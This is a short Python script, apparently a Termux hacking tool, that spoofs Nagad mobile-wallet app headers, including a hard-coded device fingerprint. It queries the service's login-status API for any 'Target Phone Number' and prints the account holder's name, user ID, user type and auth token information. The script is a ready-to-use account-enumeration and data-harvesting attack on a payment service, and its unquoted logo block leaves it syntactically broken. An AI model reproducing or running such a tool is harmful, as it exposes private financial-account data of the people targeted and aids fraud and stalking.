import os
try:
    import requests
except ModuleNotFoundError:
    os.system("pip install requests")
    import requests
from os import system as none
b="\033[1;34m"#----------𝗯𝗹𝘂𝗲
bl="\033[1;30m"#--------𝗯𝗹𝗮𝗰𝗸
c="\033[1;36m"#----------𝗰𝘆𝗮𝗻
g="\033[1;32m"#----------𝗴𝗿𝗲𝗲𝗻
p="\033[1;35m"#----------𝗽𝘂𝗿𝗽𝗹𝗲
r="\033[1;31m"#----------𝗿𝗲𝗱
y="\033[1;33m"#----------𝘆𝗲𝗹𝗹𝗼𝘄
w="\033[1;37m"#----------𝘄𝗵𝗶𝘁𝗲 {𝗲𝗻𝗱}
try:
    import phonenumbers
except ImportError:
    os.system('pip install phonenumbers')
    import phonenumbers
from phonenumbers import carrier, geocoder, timezone
# Coded By prince apu jeet 
# Termux Education Empire
import requests
logo = f'''{r}
_           _                       /\               (_)         | |
    /  \   _ __  _   _ _  ___  ___| |_                   / /\ \ | '_ \| | | | |/ _ \/ _ \ __|
  / ____ \| |_) | |_| | |  __/  __/ |_                 /_/    \_\ .__/ \__,_| |\___|\___|\__|
          | |        _/ |                                       |_|       |__/
💥▦═══█💓💓█═══▦💥
▇◤▔▔▔▔▔▔▔◥▇
▇▏◥▇◣┊◢▇◤▕▇
▇▏▃▆▅▎▅▆▃▕▇
▇▏╱▔▕▎▔▔╲▕▇
▇◣◣▃▅▎▅▃◢◢▇
▇▇◣◥▅▅▅◤◢▇▇
▇▇▇◣╲▇╱◢▇▇▇
▇▇▇▇◣▇◢▇▇▇▇
def check_user_status(phone_number):
    url = "https://app.mynagad.com:20002/api/user/check-user-status-for-log-in"

    headers = {
        "X-KM-User-AspId": "100012345612345",
        "X-KM-User-Agent": "ANDROID/1152",
        "X-KM-DEVICE-FGP": "19DC58E052A91F5B2EB59399AABB2B898CA68CFE780878C0DB69EAAB0553C3C6",
        "X-KM-Accept-language": "en",
        "X-KM-AppCode": "01",
    }

    params = {"msisdn": phone_number}

    try:
        response = requests.get(url, headers=headers, params=params)
        if response.status_code == 200:
            data = response.json()
            print(f"Name: {data.get('name', 'name not found')}")
            print(f"User ID: {data.get('userId', 'user id not found')}")
            print(f"Status: {data.get('status', 'status not found')}")
            print(f"User Type: {data.get('userType', 'user type not found')}")
            print(f"rbBase: {data.get('rbBase', 'rbBase not found')}")
            print(f"Auth Token Info: {data.get('authTokenInfo', 'auth token info not found')}")
            print(f"Verification Status: {data.get('verificationStatus', 'verification status not found')}")
            print(f"Execution Status: {data.get('executionStatus', 'execution status not found')}")
        else:
            print(f"Failed to retrieve data: {response.status_code}")
    except Exception as e:
        print(f"Error: {e}")

phone_number = input("Enter Target Phone Number :  ")
print("Please wait 1-2 seconds...")
check_user_status(phone_number)